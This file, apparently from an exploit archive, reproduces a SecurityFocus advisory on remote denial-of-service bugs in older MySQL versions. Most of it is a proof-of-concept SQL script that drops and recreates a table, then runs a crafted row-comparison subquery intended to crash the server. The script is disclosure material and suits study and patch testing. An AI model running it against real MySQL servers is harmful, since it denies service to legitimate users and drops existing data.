@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/37297/info
+
+MySQL is prone to multiple remote denial-of-service vulnerabilities because it fails to handle certain SQL expressions.
+
+An attacker can exploit these issues to crash the application, denying access to legitimate users.
+
+Versions prior to MySQL 5.0.88 and 5.1.41 are vulnerable. 
+
+drop table if exists `t1`;
+create table `t1`(`a` float);
+insert into `t1` values (-2),(-1);
+select  1 from `t1`
+where
+`a` <> '1' and not
+row(`a`,`a`) <=>
+row((select 1 from `t1` where 1=2),(select 1 from `t1`)) 
+into @`var0`;
